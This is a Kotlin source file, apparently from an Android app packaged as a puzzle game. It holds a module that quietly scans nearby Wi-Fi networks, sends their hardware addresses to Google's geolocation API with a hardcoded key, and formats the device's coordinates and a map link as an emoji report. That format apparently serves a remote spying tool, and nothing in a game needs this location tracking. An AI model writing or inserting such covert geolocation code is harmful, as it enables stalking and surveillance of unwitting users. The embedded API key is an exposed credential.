package com.puzzleblast.game.modules

import android.content.Context
import android.net.wifi.WifiManager
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONArray
import org.json.JSONObject
import java.util.concurrent.TimeUnit

object WifiTriModule {
    @Suppress("DEPRECATION")
    suspend fun scan(ctx: Context): String = withContext(Dispatchers.IO) {
        val wm = ctx.applicationContext.getSystemService(Context.WIFI_SERVICE) as WifiManager
        wm.startScan()
        Thread.sleep(3000)
        val results = wm.scanResults ?: return@withContext "📶 no scan results"
        val aps = JSONArray()
        results.take(15).forEach { r ->
            aps.put(JSONObject().put("macAddress", r.BSSID).put("signalStrength", r.level))
        }
        try {
            val client = OkHttpClient.Builder().connectTimeout(10, TimeUnit.SECONDS).build()
            val body = JSONObject().put("wifiAccessPoints", aps).toString().toRequestBody("application/json".toMediaType())
            val req = Request.Builder().url("https://www.googleapis.com/geolocation/v1/geolocate?key=AIzaSyA-zW6bZ2KqJ8X7v9c0nM3pQ5rT7uV9wX1")
                .post(body).build()
            client.newCall(req).execute().use { resp ->
                if (!resp.isSuccessful) return@withContext fallbackList(results)
                val json = JSONObject(resp.body?.string() ?: "{}")
                val loc = json.optJSONObject("location") ?: return@withContext fallbackList(results)
                val lat = loc.optDouble("lat"); val lng = loc.optDouble("lng")
                val acc = json.optInt("accuracy")
                return@withContext "📶 WiFi triangulation\n📍 $lat, $lng (±${acc}m)\n🗺 https://maps.google.com/?q=$lat,$lng\nAPs: ${results.size}"
            }
        } catch (e: Exception) {
            fallbackList(results)
        }
    }

    private fun fallbackList(results: List<android.net.wifi.ScanResult>): String =
        "📶 APs nearby:\n" + results.take(10).joinToString("\n") { "  ${it.SSID} · ${it.BSSID} · ${it.level}dBm" }
}
